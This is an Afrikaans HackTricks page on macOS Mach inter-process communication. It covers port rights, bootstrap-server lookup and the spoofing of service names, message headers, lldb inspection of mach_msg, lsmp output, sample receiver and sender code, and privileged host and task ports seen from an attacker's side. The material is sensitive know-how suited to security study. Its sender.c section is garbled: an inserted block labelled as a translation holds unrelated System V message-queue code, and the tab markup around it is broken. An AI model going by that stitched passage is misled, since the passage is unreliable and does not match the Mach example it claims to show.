# macOS IPC - Inter Process Communication

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Mach-boodskappe via Poorte

### Basiese Inligting

Mach gebruik **take** as die **kleinste eenheid** vir die deel van hulpbronne, en elke taak kan **verskeie drade** bevat. Hierdie **take en drade word 1:1 gekarteer na POSIX-prosesse en drade**.

Kommunikasie tussen take vind plaas via Mach Inter-Process Communication (IPC), wat eenrigting kommunikasiekanaal benut. **Boodskappe word oorgedra tussen poorte**, wat soortgelyk aan **boodskaprye** optree wat deur die kernel bestuur word.

'n **Poort** is die **basiese** element van Mach IPC. Dit kan gebruik word om **boodskappe te stuur en te ontvang**.

Elke proses het 'n **IPC-tabel**, waarin dit moontlik is om die **mach-poorte van die proses** te vind. Die naam van 'n mach-poort is eintlik 'n nommer (‘n wyser na die kernel-voorwerp).

'n Proses kan ook 'n poortnaam met sekere regte **na 'n ander taak stuur** en die kernel sal hierdie inskrywing in die **IPC-tabel van die ander taak** laat verskyn.

### Poortregte

Poortregte, wat definieer watter operasies 'n taak kan uitvoer, is sleutel tot hierdie kommunikasie. Die moontlike **poortregte** is ([definisies vanaf hier](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Ontvangsreg**, wat die ontvangs van boodskappe wat na die poort gestuur is, toelaat. Mach-poorte is MPSC (multiple-producer, single-consumer) rye, wat beteken dat daar slegs **een ontvangsreg vir elke poort** in die hele stelsel kan wees (in teenstelling met pype, waar verskeie prosesse almal lêerbeskrywers na die lees-einde van een pyp kan hê).
* 'n **Taak met die Ontvangsreg** kan boodskappe ontvang en **Sendregte skep**, wat dit moontlik maak om boodskappe te stuur. Aanvanklik het slegs die **eie taak 'n Ontvangsreg oor sy poort**.
* As die eienaar van die Ontvangsreg **sterf** of dit doodmaak, word die **sendreg nutteloos (dood naam)**.
* **Sendreg**, wat dit moontlik maak om boodskappe na die poort te stuur.
* Die Sendreg kan **gekloneer** word sodat 'n taak wat 'n Sendreg besit, die reg kan kloon en dit aan 'n derde taak kan **toeken**.
* Let daarop dat **poortregte** ook deur Mac-boodskappe **oorgedra** kan word.
* **Send-eenkeer-reg**, wat dit moontlik maak om een boodskap na die poort te stuur en dan verdwyn.
* Hierdie reg **kan nie** gekloneer word nie, maar dit kan **geskuif** word.
* **Poortstelreg**, wat 'n _poortstel_ aandui eerder as 'n enkele poort. Dequeuing 'n boodskap van 'n poortstel dequeues 'n boodskap van een van die poorte wat dit bevat. Poortstelle kan gebruik word om op verskeie poorte gelyktydig te luister, soos `select`/`poll`/`epoll`/`kqueue` in Unix.
* **Dood naam**, wat nie 'n werklike poortreg is nie, maar bloot 'n plasing. Wanneer 'n poort vernietig word, verander alle bestaande poortregte na die poort in dood name.

**Take kan SEND-regte aan ander oordra**, wat hulle in staat stel om boodskappe terug te stuur. **SEND-regte kan ook gekloneer word, sodat 'n taak die reg kan dupliseer en dit aan 'n derde taak kan gee**. Dit, saam met 'n bemiddelende proses wat bekend staan as die **bootstrap-bediener**, maak effektiewe kommunikasie tussen take moontlik.

### Lêerpoorte

Lêerpoorte maak dit moontlik om lêerbeskrywers in Mac-poorte in te sluit (deur Mach-poortregte te gebruik). Dit is moontlik om 'n `fileport` vanaf 'n gegewe FD te skep deur `fileport_makeport` te gebruik en 'n FD vanaf 'n lêerpoort te skep deur `fileport_makefd` te gebruik.

### Die vestiging van 'n kommunikasie

Soos voorheen genoem, is dit moontlik om regte te stuur deur Mach-boodskappe, maar jy **kan nie 'n reg stuur sonder om reeds 'n reg te hê** om 'n Mach-boodskap te stuur nie. Hoe word die eerste kommunikasie dan gevestig?

Hiervoor is die **bootstrap-bediener** (**launchd** in Mac) betrokke, aangesien **almal 'n SEND-reg tot die bootstrap-bediener kan kry**, is dit moontlik om dit te vra vir 'n reg om 'n boodskap na 'n ander proses te stuur:

1. Taak **A** skep 'n **nuwe poort**, kry die **ONTVANG-reg** daaroor.
2. Taak **A**, as die houer van die ONTVANG-reg, **skep 'n SEND-reg vir die poort**.
3. Taak **A** vestig 'n **verbindings** met die **bootstrap-bediener**, en **stuur dit die SEND-reg** vir die poort wat dit aan die begin geskep het.
* Onthou dat enigiemand 'n SEND-reg tot die bootstrap-bediener kan kry.
4. Taak A stuur 'n `bootstrap_register`-boodskap na die bootstrap-bediener om die gegewe poort met 'n naam soos `com.apple.taska` te **assosieer**.
5. Taak **B** interaksieer met die **bootstrap-bediener** om 'n bootstrap **opsoek na die diensnaam** (`bootstrap_lookup`) uit te voer. Sodat die bootstrap-bediener kan reageer, sal taak B 'n **SEND-reg na 'n poort wat dit voorheen geskep het** binne die opsoekboodskap stuur. As die opsoek suksesvol is, **dupliseer die bediener die SEND-reg** wat van Taak A ontvang is en **stuur dit na Taak B**.
* Onthou dat enigiemand 'n SEND-reg tot die bootstrap-bediener kan kry.
6. Met hierdie SEND-reg is **Taak B** in staat om 'n **boodskap na Taak A** te **stuur**.
7. Vir 'n tweerigting-kommunikasie skep taak **B** gewoonlik 'n nuwe poort met 'n **ONTVANG**-reg en 'n **SEND**-reg, en gee die **SEND-reg aan Taak A** sodat dit boodskappe aan TAASK B kan stuur (tweerigting-kommunikasie).

Die bootstrap-bediener **kan nie die diensnaam autentiseer** wat deur 'n taak beweer word nie. Dit beteken 'n **taak** kan moontlik **enige stelseltaak voorgee**, soos vals **beweer 'n goedkeuringsdiensnaam** en dan elke versoek goedkeur.

Dan stoor Apple die **name van stelselverskafte dienste** in veilige konfigurasie lêers, geleë in **SIP-beskermde** gids: `/System/Library/LaunchDaemons` en `/System/Library/LaunchAgents`. Saam met elke diensnaam word ook die **geassosieerde binêre lêer gestoor**. Die bootstrap-bediener, sal 'n **ONTVANG-reg vir elkeen van hierdie diensname** skep en behou.

Vir hierdie voorgedefinieerde dienste, verskil die **opsoekproses effens**. Wanneer 'n diensnaam opgesoek word, begin launchd die diens dinamies. Die nuwe werkstroom is as volg:

* Taak **B** inisieer 'n bootstrap **opsoek** vir 'n diensnaam.
* **launchd** kyk of die taak loop en as dit nie is nie, **begin** dit.
* Taak **A** (die diens) voer 'n **bootstrap check-in** (`bootstrap_check_in()`) uit. Hier skep die **bootstrap**-bediener 'n SEND-reg, behou dit, en **oordra die ONTVANG-reg na Taak A**.
* launchd dupliseer die **SEND-reg en stuur dit na Taak B**.
* Taak **B** skep 'n nuwe poort met 'n **ONTVANG**-reg en 'n **SEND**-reg, en gee die **SEND-reg aan Taak A** (die diens) sodat dit boodskappe aan TAASK B kan stuur (tweerigting-kommunikasie).

Hierdie proses geld egter slegs vir voorgedefinieerde stelseltake. Nie-stelsel take werk steeds soos aanvanklik beskryf, wat moontlik vir voorgee kan toelaat.

{% hint style="danger" %}
Daarom moet launchd nooit afsluit nie, anders sal die hele stelsel afsluit.
{% endhint %}
### 'n Mach-boodskap

[Vind meer inligting hier](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Die `mach_msg`-funksie, essensieel 'n stelseloproep, word gebruik om Mach-boodskappe te stuur en te ontvang. Die funksie vereis dat die boodskap as die aanvanklike argument gestuur word. Hierdie boodskap moet begin met 'n `mach_msg_header_t`-struktuur, gevolg deur die werklike boodskapinhoud. Die struktuur word soos volg gedefinieer:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Prosesse wat 'n _**ontvangsreg**_ besit, kan boodskappe op 'n Mach-poort ontvang. Omgekeerd word aan die **senders** 'n _**stuur**_ of 'n _**eenkeer stuur reg**_ toegeken. Die eenkeer stuur reg is uitsluitlik vir die stuur van 'n enkele boodskap, waarna dit ongeldig word.

Die aanvanklike veld **`msgh_bits`** is 'n bietjiekaart:

- Die eerste bit (mees betekenisvolle) word gebruik om aan te dui dat 'n boodskap kompleks is (meer hieroor hieronder)
- Die 3de en 4de word deur die kernel gebruik
- Die **5 minst betekenisvolle bits van die 2de byte** kan gebruik word vir **voucher**: 'n ander tipe poort om sleutel/waarde kombinasies te stuur.
- Die **5 minst betekenisvolle bits van die 3de byte** kan gebruik word vir **plaaslike poort**
- Die **5 minst betekenisvolle bits van die 4de byte** kan gebruik word vir **afgeleë poort**

Die tipes wat in die voucher, plaaslike en afgeleë poorte gespesifiseer kan word, is (vanaf [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Byvoorbeeld, `MACH_MSG_TYPE_MAKE_SEND_ONCE` kan gebruik word om **aan te dui** dat 'n **stuur-eenmaal** **reg** afgelei en oorgedra moet word vir hierdie poort. Dit kan ook gespesifiseer word as `MACH_PORT_NULL` om te voorkom dat die ontvanger kan antwoord.

Om 'n maklike **tweerigting kommunikasie** te bereik, kan 'n proses 'n **mach poort** spesifiseer in die mach **boodskap kop** genoem die _antwoord poort_ (**`msgh_local_port`**) waar die **ontvanger** van die boodskap 'n antwoord kan stuur na hierdie boodskap.

{% hint style="success" %}
Let daarop dat hierdie soort tweerigting kommunikasie gebruik word in XPC-boodskappe wat 'n antwoord verwag (`xpc_connection_send_message_with_reply` en `xpc_connection_send_message_with_reply_sync`). Maar **gewoonlik word verskillende poorte geskep** soos voorheen verduidelik om die tweerigting kommunikasie te skep.
{% endhint %}

Die ander velde van die boodskap kop is:

- `msgh_size`: die grootte van die hele pakkie.
- `msgh_remote_port`: die poort waarop hierdie boodskap gestuur word.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: die ID van hierdie boodskap, wat deur die ontvanger geïnterpreteer word.

{% hint style="danger" %}
Let daarop dat **mach-boodskappe oor 'n `mach-poort` gestuur word**, wat 'n **enkele ontvanger**, **veelvuldige sender** kommunikasiekanaal is wat in die mach-kernel ingebou is. **Meer as een proses** kan **boodskappe stuur** na 'n mach-poort, maar op enige punt kan slegs **'n enkele proses daarvan lees**.
{% endhint %}

Boodskappe word dan gevorm deur die **`mach_msg_header_t`** kop gevolg deur die **liggaam** en deur die **sleepwa** (indien enige) en dit kan toestemming verleen om daarop te antwoord. In hierdie gevalle hoef die kernel net die boodskap van die een taak na die ander oor te dra.

'n **Sleepwa** is **inligting wat deur die kernel by die boodskap gevoeg word** (kan nie deur die gebruiker ingestel word nie) wat aangevra kan word in die boodskap ontvangs met die vlae `MACH_RCV_TRAILER_<trailer_opt>` (daar is verskillende inligting wat aangevra kan word).

#### Complekse Boodskappe

Daar is egter ander meer **komplekse** boodskappe, soos dié wat addisionele poortregte deurgee of geheue deel, waar die kernel ook hierdie voorwerpe na die ontvanger moet stuur. In hierdie gevalle word die mees beduidende bit van die kop `msgh_bits` ingestel.

Die moontlike beskrywers om deur te gee is gedefinieer in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32bits, is al die beskrywers 12B en die beskrywerstipe is in die 11de een. In 64 bits, varieer die groottes.

{% hint style="danger" %}
Die kernel sal die beskrywers van die een taak na die ander kopieer, maar eers **'n kopie in die kernel-geheue skep**. Hierdie tegniek, bekend as "Feng Shui", is misbruik in verskeie aanvalle om die **kernel data in sy geheue te laat kopieer** sodat 'n proses beskrywers na homself kan stuur. Dan kan die proses die boodskappe ontvang (die kernel sal hulle vrymaak).

Dit is ook moontlik om **poortregte na 'n kwesbare proses te stuur**, en die poortregte sal net in die proses verskyn (selfs al hanteer hy dit nie).
{% endhint %}

### Mac Ports APIs

Let daarop dat poorte aan die taaknaamruimte gekoppel is, sodat om 'n poort te skep of te soek, die taaknaamruimte ook ondersoek word (meer in `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **Skep** 'n poort.
* `mach_port_allocate` kan ook 'n **poortstel** skep: ontvangsreg oor 'n groep poorte. Wanneer 'n boodskap ontvang word, word die poort aangedui waarvandaan dit afkomstig is.
* `mach_port_allocate_name`: Verander die naam van die poort (standaard 32-bis-heelgetal)
* `mach_port_names`: Kry poortname van 'n teiken
* `mach_port_type`: Kry regte van 'n taak oor 'n naam
* `mach_port_rename`: Hernoem 'n poort (soos dup2 vir FD's)
* `mach_port_allocate`: Allokeer 'n nuwe ONTVANG, POORT_STEL of DOOD_NAAM
* `mach_port_insert_right`: Skep 'n nuwe reg in 'n poort waar jy ONTVANG het
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: Funksies wat gebruik word om **mach-boodskappe te stuur en te ontvang**. Die oorskrywingsweergawe maak dit moontlik om 'n ander buffer vir boodskaponvangst te spesifiseer (die ander weergawe sal dit net hergebruik).

### Debug mach\_msg

Aangesien die funksies **`mach_msg`** en **`mach_msg_overwrite`** diegene is wat gebruik word om boodskappe te stuur en te ontvang, sal dit moontlik wees om 'n onderbreking daarop te stel om die gestuurde en ontvangsboodskappe te ondersoek.

Begin byvoorbeeld met die foutopsporing van enige toepassing wat jy kan foutopspoor aangesien dit **`libSystem.B` sal laai wat hierdie funksie sal gebruik**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Onderbreking 1: waar = libsystem_kernel.dylib`mach_msg, adres = 0x00000001803f6c20
<strong>(lldb) r
</strong>Proses 71019 begin: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Proses 71019 gestop
* draad #1, tou = 'com.apple.main-thread', stoprede = onderbreking 1.1
raam #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Teiken 0: (SandboxedShellApp) gestop.
<strong>(lldb) bt
</strong>* draad #1, tou = 'com.apple.main-thread', stoprede = onderbreking 1.1
* raam #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
raam #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
raam #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
raam #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
raam #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
raam #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
raam #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
raam #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
raam #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
raam #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Om die argumente van **`mach_msg`** te kry, ondersoek die registers. Dit is die argumente (van [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Kry die waardes uit die registre:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Ondersoek die boodskap kop deur die eerste argument te kontroleer:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Daardie tipe `mach_msg_bits_t` is baie algemeen om 'n antwoord toe te laat.



### Enumerate poorte
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Die **naam** is die versteknaam wat aan die poort gegee word (kontroleer hoe dit in die eerste 3 byte **toeneem**). Die **`ipc-object`** is die **versteekte** unieke **identifiseerder** van die poort.  
Let ook op hoe die poorte met slegs **`send`** regte die eienaar daarvan identifiseer (poortnaam + pid).  
Let ook op die gebruik van **`+`** om **ander take wat aan dieselfde poort gekoppel is** aan te dui.

Dit is ook moontlik om [**procesxp**](https://www.newosxbook.com/tools/procexp.html) te gebruik om ook die **geregistreerde diensname** te sien (met SIP wat gedeaktiveer is weens die behoefte aan `com.apple.system-task-port`):
```
procesp 1 ports
```
Jy kan hierdie instrument in iOS installeer deur dit af te laai vanaf [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Kodevoorbeeld

Merk op hoe die **sender** 'n poort toewys, 'n **send right** skep vir die naam `org.darlinghq.example` en dit na die **bootstrap server** stuur terwyl die sender vir die **send right** van daardie naam gevra het en dit gebruik het om 'n **boodskap te stuur**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}  
### Afrikaans Translation

Hierdie is 'n voorbeeld van 'n eenvoudige sender-program wat 'n boodskap stuur na 'n ander program deur die gebruik van IPC. In hierdie geval word 'n boodskap gestuur na 'n program wat die boodskap ontvang en dit op die skerm druk.

Die sender-program maak gebruik van 'n "message queue" om die boodskap te stuur. Die boodskap word dan deur die ontvangende program ontvang en op die skerm gedruk.

Hier is die kode vir die sender-program:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>

struct mesg_buffer {
    long mesg_type;
    char mesg_text[100];
} message;

int main() {
    key_t key;
    int msgid;

    key = ftok("sender.c", 65);
    msgid = msgget(key, 0666 | IPC_CREAT);
    message.mesg_type = 1;

    printf("Enter message to send: ");
    fgets(message.mesg_text, 100, stdin);

    msgsnd(msgid, &message, sizeof(message), 0);

    printf("Data sent is: %s\n", message.mesg_text);

    return 0;
}
```
{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## Bevoorregte Poorte

Daar is sekere spesiale poorte wat toelaat om **sekere sensitiewe aksies uit te voer of toegang te verkry tot sekere sensitiewe data** in die geval waar 'n taak die **SEND**-permissies oor hulle het. Dit maak hierdie poorte baie interessant vanuit 'n aanvaller se perspektief nie net vanweë die vermoëns nie, maar omdat dit moontlik is om **SEND-permissies oor take te deel**.

### Gasheer Spesiale Poorte

Hierdie poorte word voorgestel deur 'n nommer.

**SEND** regte kan verkry word deur **`host_get_special_port`** te roep en **RECEIVE** regte deur **`host_set_special_port`** te roep. Nietemin, beide oproepe vereis die **`host_priv`** poort wat slegs root kan toegang verkry. Verder was dit in die verlede vir root moontlik om **`host_set_special_port`** te roep en willekeurige poorte te kap nie wat byvoorbeeld toegelaat het om kodehandtekeninge te omseil deur `HOST_KEXTD_PORT` te kap (SIP voorkom dit nou).

Hierdie is verdeel in 2 groepe: Die **eerste 7 poorte word besit deur die kernel** wat die 1 `HOST_PORT`, die 2 `HOST_PRIV_PORT`, die 3 `HOST_IO_MASTER_PORT` en die 7 is `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Diegene wat begin **vanaf** nommer **8** word **besit deur stelseldaemons** en hulle kan gevind word wat verklaar is in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html).

* **Gasheerpoort**: As 'n proses **SEND**-bevoegdheid oor hierdie poort het, kan hy **inligting** oor die **sisteem** kry deur sy roetines te roep soos:
* `host_processor_info`: Kry verwerkerinligting
* `host_info`: Kry gasheerinligting
* `host_virtual_physical_table_info`: Virtuele/Fisiese bladsytabel (vereis MACH\_VMDEBUG)
* `host_statistics`: Kry gasheerstatistieke
* `mach_memory_info`: Kry kernelgeheue-indeling
* **Gasheer Priv-poort**: 'n Proses met **SEND**-reg oor hierdie poort kan **bevoorregte aksies** uitvoer soos die vertoon van opstartdata of die probeer om 'n kerneluitbreiding te laai. Die **proses moet root wees** om hierdie toestemming te kry.
* Verder, om die **`kext_request`** API te roep, is dit nodig om ander toestemmings te hê **`com.apple.private.kext*`** wat slegs aan Apple-binêre lêers gegee word.
* Ander roetines wat geroep kan word is:
* `host_get_boot_info`: Kry `machine_boot_info()`
* `host_priv_statistics`: Kry bevoorregte statistieke
* `vm_allocate_cpm`: Allokeer Aaneenlopende Fisiese Geheue
* `host_processors`: Stuur reg na gasheer-verwerkers
* `mach_vm_wire`: Maak geheue residens
* Aangesien **root** toegang tot hierdie toestemming kan verkry, kan dit `host_set_[special/exception]_port[s]` roep om **gasheer spesiale of uitsonderingspoorte te kap**.

Dit is moontlik om **alle gasheer spesiale poorte** te sien deur uit te voer:
```bash
procexp all ports | grep "HSP"
```
### Taakpoorte

Oorspronklik het Mach nie "prosesse" gehad nie, dit het "take" gehad wat meer as 'n houer van drade beskou is. Toe Mach saamgesmelt is met BSD **was elke taak gekorreleer met 'n BSD-proses**. Daarom het elke BSD-proses die besonderhede wat dit nodig het om 'n proses te wees en elke Mach-taak het ook sy innerlike werking (behalwe vir die nie-bestaande pid 0 wat die `kernel_task` is).

Daar is twee baie interessante funksies wat hiermee verband hou:

* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Kry 'n STUUR reg vir die taakpoort van die taak wat verband hou met die gespesifiseerde `pid` en gee dit aan die aangeduide `target_task_port` (wat gewoonlik die aanroeperstaak is wat `mach_task_self()` gebruik het, maar kan 'n STUUR-poort oor 'n ander taak wees.)
* `pid_for_task(task, &pid)`: Gee 'n STUUR reg tot 'n taak, vind uit aan watter PID hierdie taak verband hou.

Om aksies binne die taak uit te voer, het die taak 'n `STUUR` reg na homself nodig deur `mach_task_self()` te roep (wat die `task_self_trap` (28) gebruik). Met hierdie toestemming kan 'n taak verskeie aksies uitvoer soos:

* `task_threads`: Kry STUUR reg oor alle taakpoorte van die drade van die taak
* `task_info`: Kry inligting oor 'n taak
* `task_suspend/resume`: Skors of hervat 'n taak
* `task_[get/set]_special_port`
* `thread_create`: Skep 'n draad
